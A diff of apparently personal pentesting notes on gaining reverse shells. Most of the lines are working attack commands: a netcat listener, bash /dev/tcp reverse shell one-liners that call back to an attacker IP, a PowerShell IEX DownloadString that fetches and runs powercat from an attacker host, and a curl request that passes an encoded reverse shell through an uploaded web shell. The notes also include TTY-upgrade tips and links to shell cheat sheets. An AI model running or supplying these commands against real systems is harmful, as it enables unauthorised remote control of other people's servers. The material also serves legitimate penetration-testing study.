@@ -7,10 +7,11 @@ resource of the target.
 1.The command on the attack host:
 nc -lvnp {port_number}
 
-2.The malicious RCE command on the target:
+2.The malicious reverse shell command on the target:
 2-1.Linux:
 2-1-1./bin/bash -i>/dev/tcp/{Attacker_IP}/{Attacker_Port} 0<&1 2>&1
 2-1-2./bin/bash -c '/bin/bash -i>/dev/tcp/{Attacker_IP}/{Attacker_Port} 0<&1 2>&1'
+(FD0--->Stdin, FD1--->Stdout, FD2--->Stderr)
 
 2-1-3.If attacker would like to get the shell of the target in half-crippled-tty mode, attacker could let the target do below command:
 script -qc /bin/bash /dev/null
@@ -29,14 +30,33 @@ export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset
 
 2-2.Windows:
 2-2-1.https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
+2-2-2.Kali-/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1
+2-2-3.We need to notice one thing:
+The Windows malicious reverse shell command sometimes should be encoded with 'UTF-16LE (1200)' and 'BASE-64'.
 
-2-2-2.Kali-powercat.ps1:
-If the target is web server, we could do LFi way to fulfill RCE attack.
+2-3.Another resources for the malicious reverse shell command we could refer:
+https://www.revshells.com/
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+https://hacktricks.xsx.tw/generic-methodologies-and-resources/shells
+
+3.Tips for do reverse shell attack:
+Before doing follow attack, u need to open your listen port on your attack host.
+3-1.Remote logging the target, then implement the malicious reverse shell command on it.
+
+3-2.Web-RCE.
+If the target is web server, we could do LFi way to fulfill RCE attack.There are two ways to do that:
+A.curl RCE:
+Step1.Uploading the executable file to the target server.
+Step2.After uploading, we do below command:
+curl http://abc.com/uploads/cmd.php --data-urlencode 'cmd=powershell+-e+{Windows-reverse shell command with "UTF-16LE (1200)" and "BASE-64"}'
+Step3.Then,u could get the Windows shell on the target.
+B.Kali-powercat.ps1:
 Step1.First,we copy /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 to /home/kali in Kali.
 Step2.After copying,we trigger HTTP shared service and pass this script to the target.
 Step3.Then,we do below command on our browser client:
 IEX (New-Object System.Net.Webclient).DownloadString("http://{Attack_IPv4}/powercat.ps1");powercat -c {Attacker_IPv4} -p {Reverse_shell_port} -e powershell 
 Step4.Finally,we get the shell of the web server based on Windows.
 
-2-2-3.We need to notice one thing:
-The windows malicious RCE command is sometimes encoded with 'UTF-
+3-3.We could pass the malicious RCE command to the target by 'mail', 'smbclient', and 'wsgidav'.
+3-4.Msfvenom tool.
+3-5.Shelter tool.
